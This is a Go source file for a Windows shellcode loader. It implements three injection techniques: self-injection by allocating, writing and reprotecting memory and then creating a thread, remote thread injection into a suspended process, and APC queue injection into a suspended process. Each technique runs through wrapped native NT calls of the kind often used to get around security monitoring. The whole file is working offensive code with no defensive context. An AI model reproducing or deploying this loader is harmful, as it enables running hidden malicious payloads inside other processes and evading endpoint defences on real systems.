// + build windows

package loader

import (
	"fmt"

	"golang.org/x/sys/windows"
)

func (l *Loader) selfInjectThread(scbuf []byte) error {
	var (
		err        error
		scBaseAddr uintptr
		hThread    uintptr
	)
	hSelf := uintptr(0xffffffffffffffff) // handle to current proc
	scBaseAddr, err = l.NtAllocateVirtualMemory(
		hSelf,
		scBaseAddr,
		len(scbuf),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		return err
	}
	fmt.Printf("Base address of allocated memory: 0x%016x\n", scBaseAddr)

	if _, err := l.NtWriteVirtualMemory(hSelf, scBaseAddr, scbuf, len(scbuf)); err != nil {
		return err
	}
	fmt.Println("Shellcode copied to allocated memory")

	fmt.Println("Changing memory protection to RX")
	if _, err := l.NtProtectVirtualMemory(hSelf, scBaseAddr, len(scbuf), windows.PAGE_EXECUTE_READ, windows.PAGE_READWRITE); err != nil {
		return err
	}

	fmt.Println("Creating thread to exec shellcode ...")
	hThread, err = l.NtCreateThreadEx(hThread, hSelf, scBaseAddr)
	if err != nil {
		return err
	}

	windows.WaitForSingleObject(windows.Handle(hThread), 0xffffffff)

	fmt.Println("Injection complted succesfully")
	return nil
}

func (l *Loader) remoteThreadInject(scbuf []byte) error {
	var (
		err        error
		scBaseAddr uintptr
	)

	fmt.Println("Creating suspended process ...")
	pi, err := l.createSuspendedProcess()
	if err != nil {
		return err
	}

	scBaseAddr, err = l.NtAllocateVirtualMemory(
		uintptr(pi.Process),
		scBaseAddr,
		len(scbuf),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		return err
	}
	fmt.Printf("Base address of allocated memory: 0x%016x\n", scBaseAddr)

	if _, err := l.NtWriteVirtualMemory(uintptr(pi.Process), scBaseAddr, scbuf, len(scbuf)); err != nil {
		return err
	}
	fmt.Println("Shellcode copied to allocated memory")

	fmt.Println("Changing memory protection to RX")
	if _, err := l.NtProtectVirtualMemory(uintptr(pi.Process), scBaseAddr, len(scbuf), windows.PAGE_EXECUTE_READ, windows.PAGE_READWRITE); err != nil {
		return err
	}

	fmt.Println("Creating thread to exec shellcode ...")
	_, err = l.NtCreateThreadEx(uintptr(pi.Thread), uintptr(pi.Process), scBaseAddr)
	if err != nil {
		return err
	}

	fmt.Println("Closing thread handle ...")
	if err := windows.Close(windows.Handle(pi.Process)); err != nil {
		return err
	}

	fmt.Println("Injection completed succesfully!")
	return nil
}

func (l *Loader) queueUserAPC(scbuf []byte) error {
	var (
		err        error
		scBaseAddr uintptr
	)

	pi, err := l.createSuspendedProcess()
	if err != nil {
		return err
	}
	fmt.Printf("Created suspended process ...\n")

	scBaseAddr, err = l.NtAllocateVirtualMemory(
		uintptr(pi.Process),
		scBaseAddr,
		len(scbuf),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		return err
	}
	fmt.Printf("Base address of allocated memory: 0x%016x\n", scBaseAddr)

	if _, err := l.NtWriteVirtualMemory(uintptr(pi.Process), scBaseAddr, scbuf, len(scbuf)); err != nil {
		return err
	}
	fmt.Println("Writing shellcode to allocated memory")

	fmt.Println("Changing memory protection to RX")
	if _, err := l.NtProtectVirtualMemory(uintptr(pi.Process), scBaseAddr, len(scbuf), windows.PAGE_EXECUTE_READ, windows.PAGE_READWRITE); err != nil {
		return err
	}

	fmt.Println("Adding thread to APC queue ...")
	if _, err := l.NtQueueApcThread(uintptr(pi.Thread), scBaseAddr); err != nil {
		return err
	}

	fmt.Println("Resuming thread to execute shellcode...")
	if _, err := windows.ResumeThread(windows.Handle(pi.Thread)); err != nil {
		return err
	}

	fmt.Println("Injection completed succesfully")
	return nil
}
